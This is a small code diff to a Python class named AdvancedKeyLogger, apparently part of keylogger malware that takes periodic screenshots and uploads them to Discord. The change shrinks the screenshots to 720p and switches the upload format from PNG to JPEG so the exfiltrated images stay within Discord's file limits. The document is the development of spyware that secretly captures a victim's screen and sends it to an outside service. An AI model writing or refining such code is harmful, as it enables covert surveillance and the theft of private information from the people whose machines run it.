@@ -153,7 +153,7 @@ class AdvancedKeyLogger:
                     callback=self._on_screenshot_taken,
                     interval=SCREENSHOT_INTERVAL,
                     quality=70,  # Good quality without exceeding Discord limits
-                    max_size=(1920, 1080)  # Full HD resolution
+                    max_size=(1280, 720)  # 720p resolution - smaller file size
                 )
                 if self.screenshot_capture.start():
                     print("[+] Screenshot capture started")
@@ -372,7 +372,7 @@ class AdvancedKeyLogger:
 
                         # Create multipart form data with file
                         files = {
-                            'file': (f'screenshot_{screenshot["timestamp"]}.png', image_bytes, 'image/png')
+                            'file': (f'screenshot_{screenshot["timestamp"]}.jpg', image_bytes, 'image/jpeg')
                         }
 
                         # Create payload with embed
